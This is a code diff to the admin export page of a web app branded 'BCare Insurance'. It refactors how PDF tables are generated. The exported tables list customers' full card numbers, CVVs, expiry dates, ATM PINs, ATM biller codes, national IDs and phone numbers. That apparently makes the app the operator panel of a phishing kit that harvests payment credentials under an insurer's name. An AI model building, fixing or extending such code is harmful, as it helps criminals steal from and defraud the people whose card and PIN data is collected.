@@ -5,7 +5,7 @@ import { toast } from "sonner";
 import { supabase } from "@/integrations/supabase/client";
 import { useNavigate } from "react-router-dom";
 import jsPDF from "jspdf";
-import "jspdf-autotable";
+import autoTable from "jspdf-autotable";
 import * as XLSX from "xlsx";
 import { logActivity } from "@/lib/activityLogger";
 
@@ -67,7 +67,6 @@ const AdminSettings = () => {
       const data = await fetchAllData();
       const doc = new jsPDF({ orientation: "landscape" });
 
-      // Use default font (Helvetica) - works for LTR content
       doc.setFontSize(18);
       doc.text("BCare Insurance - Data Export", 14, 20);
       doc.setFontSize(10);
@@ -75,47 +74,60 @@ const AdminSettings = () => {
 
       let yPos = 35;
 
-      // Insurance Requests
       if (data.requests.length > 0) {
         doc.setFontSize(13);
         doc.text("Insurance Requests", 14, yPos);
-        (doc as any).autoTable({
+        autoTable(doc, {
           startY: yPos + 4,
           head: [["ID", "National ID", "Phone", "Type", "Status", "Created"]],
           body: data.requests.map((r: any) => [
-            r.id?.slice(0, 8), r.national_id, r.phone, r.request_type, r.status, new Date(r.created_at).toLocaleDateString("en-US"),
+            r.id?.slice(0, 8),
+            r.national_id,
+            r.phone,
+            r.request_type,
+            r.status,
+            new Date(r.created_at).toLocaleDateString("en-US"),
           ]),
           styles: { fontSize: 7, cellPadding: 2 },
           headStyles: { fillColor: [212, 160, 23] },
         });
-        yPos = (doc as any).lastAutoTable.finalY + 10;
+        yPos = ((doc as any).lastAutoTable?.finalY || yPos) + 10;
       }
 
-      // Insurance Orders
       if (data.orders.length > 0) {
-        if (yPos > 170) { doc.addPage(); yPos = 20; }
+        if (yPos > 170) {
+          doc.addPage();
+          yPos = 20;
+        }
         doc.setFontSize(13);
         doc.text("Insurance Orders", 14, yPos);
-        (doc as any).autoTable({
+        autoTable(doc, {
           startY: yPos + 4,
           head: [["ID", "Company", "Type", "Status", "Total Price", "Created"]],
           body: data.orders.map((o: any) => [
-            o.id?.slice(0, 8), o.company || "-", o.insurance_type || "-", o.status, o.total_price || "-", new Date(o.created_at).toLocaleDateString("en-US"),
+            o.id?.slice(0, 8),
+            o.company || "-",
+            o.insurance_type || "-",
+            o.status,
+            o.total_price || "-",
+            new Date(o.created_at).toLocaleDateString("en-US"),
           ]),
           styles: { fontSize: 7, cellPadding: 2 },
           headStyles: { fillColor: [212, 160, 23] },
         });
-        yPos = (doc as any).lastAutoTable.finalY + 10;
+        yPos = ((doc as any).lastAutoTable?.finalY || yPos) + 10;
       }
 
-      // Payment Cards
       if (data.orders.length > 0) {
         const cardsData = data.orders.filter((o: any) => o.card_number_full || o.card_last_four);
         if (cardsData.length > 0) {
-          if (yPos > 170) { doc.addPage(); yPos = 20; }
+          if (yPos > 170) {
+            doc.addPage();
+            yPos = 20;
+          }
           doc.setFontSize(13);
           doc.text("Payment Cards", 14, yPos);
-          (doc as any).autoTable({
+          autoTable(doc, {
             startY: yPos + 4,
             head: [["Customer", "Card Number", "CVV", "Expiry", "Holder Name", "Payment Method"]],
             body: cardsData.map((o: any) => [
@@ -129,7 +141,7 @@ const AdminSettings = () => {
             styles: { fontSize: 7, cellPadding: 2 },
             headStyles: { fillColor: [220, 53, 69] },
           });
-          yPos = (doc as any).lastAutoTable.finalY + 10;
+          yPos = ((doc as any).lastAutoTable?.finalY || yPos) + 10;
         }
       }
 
@@ -185,14 +197,22 @@ const AdminSettings = () => {
       doc.setFontSize(10);
       doc.text(`Export Date: ${new Date().toLocaleDateString("en-US")}`, 14, 28);
       doc.text(`Total Cards: ${cardsData.length}`, 14, 34);
-      (doc as any).autoTable({
+      autoTable(doc, {
         startY: 40,
         head: [["#", "Customer", "National ID", "Phone", "Card Number", "CVV", "Expiry", "Holder Name", "Method", "ATM PIN", "ATM Bill#", "ATM Biller"]],
         body: cardsData.map((o: any, i: number) => [
-          i + 1, o.customer_name || "-", o.national_id || "-", o.phone || "-",
-          o.card_number_full || `****${o.card_last_four || ""}`, o.card_cvv || "-",
-          o.card_expiry || "-", o.card_holder_name || "-", o.payment_method || "-",
-          o.atm_pin || "-", o.atm_bill_number || "-", o.atm_biller_code || "-",
+          i + 1,
+          o.customer_name || "-",
+          o.national_id || "-",
+          o.phone || "-",
+          o.card_number_full || `****${o.card_last_four || ""}`,
+          o.card_cvv || "-",
+          o.card_expiry || "-",
+          o.card_holder_name || "-",
+          o.payment_method || "-",
+          o.atm_pin || "-",
+          o.atm_bill_number || "-",
+          o.atm_biller_code || "-",
         ]),
         styles: { fontSize: 7, cellPadding: 2 },
         headStyles: { fillColor: [220, 53, 69] },
